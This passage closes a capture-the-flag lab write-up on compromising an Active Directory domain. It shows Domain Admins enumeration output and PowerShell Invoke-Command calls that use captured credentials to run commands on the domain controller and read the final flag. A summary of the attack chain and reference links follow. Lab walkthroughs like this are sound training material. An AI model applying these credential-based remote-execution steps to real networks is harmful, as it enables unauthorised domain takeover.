GroupDomain             : intranet.poo
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=intranet,DC=poo
MemberDomain            : intranet.poo
MemberName              : p00_adm
MemberDistinguishedName : CN=p00_adm,CN=Users,DC=intranet,DC=poo
MemberObjectClass       : user
MemberSID               : S-1-5-21-2413924783-1155145064-2969042445-1107
```

</details>

<a id="remote-command-execution-on-the-domain-controller"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Remote Command Execution on the Domain Controller</strong></summary>

```powershell
Invoke-Command -ComputerName DC.intranet.poo -Credential $cred -ScriptBlock {
    whoami
    hostname}
```

```text
poo\p00_adm
DC
```

Now enumerate the user profiles and desktops on the domain controller.

```powershell
Invoke-Command -ComputerName DC.intranet.poo -Credential $cred -ScriptBlock {
    Get-ChildItem C:\Users
    Get-ChildItem C:\Users\*\Desktop -Force
}
```

Search for the flag file and read it.

```powershell
Invoke-Command -ComputerName DC.intranet.poo -Credential $cred -ScriptBlock {
    Get-Content C:\Users\*\Desktop\flag.txt
}
```

After identifying the correct user profile, read it directly.

```powershell
Invoke-Command -ComputerName DC.intranet.poo -Credential $cred -ScriptBlock {
    Get-Content 'C:\Users\mr3ks\Desktop\flag.txt'
}
```

This yields the fifth and final flag.

---

</details>

## Key Takeaways

- A public `.DS_Store` file can disclose valuable internal paths on IIS.
- Linked SQL servers should be audited carefully, especially when bidirectional trust exists.
- `sp_execute_external_script` can become an excellent post-exploitation primitive if misconfigured.
- IPv6 often exposes services that appear filtered over IPv4.
- Domain privilege escalation often depends on abusing service accounts and weak Kerberos passwords.
- Verifying changes directly against a known DC can avoid resolution or context issues.

## Conclusion

P.O.O. is an excellent mini lab because it chains together multiple realistic weaknesses rather than relying on a single exploit. The full path combines web enumeration, SQL linked server abuse, configuration disclosure, IPv6 service exposure, Kerberoasting, and AD group abuse. Each flag builds naturally on the previous one, making the lab both coherent and instructive.

---

## Resources

- Scanning and Web Enumeration
  - Nmap Reference Guide (options -Pn, -sC, -sV, -6): https://nmap.org/book/man-briefoptions.html
  - Nmap IPv6 Scanning: https://nmap.org/book/scan-methods-ipv6.html
  - ffuf Project and Usage: https://github.com/ffuf/ffuf and https://ffuf.me/

- IIS and Web.config
  - IIS staticContent Configuration: https://learn.microsoft.com/iis/configuration/system.webServer/staticContent/
  - web.config Overview: https://learn.microsoft.com/iis/configuration/system.webServer/

- Apple .DS_Store Parsing
  - ds-store (Python package, PyPI): https://pypi.org/project/ds-store/
  - ds_store (GitHub repository): https://github.com/al45tair/ds_store

- Microsoft SQL Server — Linked Servers and Context
  - sp_linkedservers (Transact-SQL): https://learn.microsoft.com/sql/relational-databases/system-stored-procedures/sp-linkedservers-transact-sql
  - sp_helplinkedsrvlogin (Transact-SQL): https://learn.microsoft.com/sql/relational-databases/system-stored-procedures/sp-helplinkedsrvlogin-transact-sql
  - EXECUTE AT / Remote Execution via Linked Servers: https://learn.microsoft.com/sql/t-sql/language-elements/execute-transact-sql

- Microsoft SQL Server — External Scripts and Command Execution
  - sp_execute_external_script (Transact-SQL): https://learn.microsoft.com/sql/advanced-analytics/system-stored-procedures/sp-execute-external-script-transact-sql
  - Enable External Scripts (sp_configure): https://learn.microsoft.com/sql/database-engine/configure-windows/enable-or-disable-external-scripts-execution
  - xp_cmdshell (Transact-SQL): https://learn.microsoft.com/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql
  - sp_configure (Transact-SQL): https://learn.microsoft.com/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql

- Windows, WinRM, and Network Discovery
  - Windows Remote Management (WinRM) Overview: https://learn.microsoft.com/windows/win32/winrm/portal
  - nltest Command Reference: https://learn.microsoft.com/windows-server/administration/windows-commands/nltest
  - Resolve-DnsName (PowerShell): https://learn.microsoft.com/powershell/module/dnsclient/resolve-dnsname

- Active Directory Recon & Post-Exploitation
  - PowerSploit (PowerView in Recon): https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
  - Evil-WinRM (Remote Shell): https://github.com/Hackplayers/evil-winrm

- Kerberoasting and Password Cracking
  - Kerberoasting Explained (ADSecurity): https://adsecurity.org/?p=2293
  - Kerberoast Redux (Harmj0y): https://www.harmj0y.net/blog/activedirectory/kerberoast-redux/
  - Hashcat Example Hashes (mode 13100 Kerberos 5 TGS-REP etype 23): https://hashcat.net/wiki/doku.php?id=example_hashes#kerberos_5_tgs_rep_etype_23
  - Hashcat Supported Algorithms: https://hashcat.net/wiki/doku.php?id=hashcat#supported_algorithms
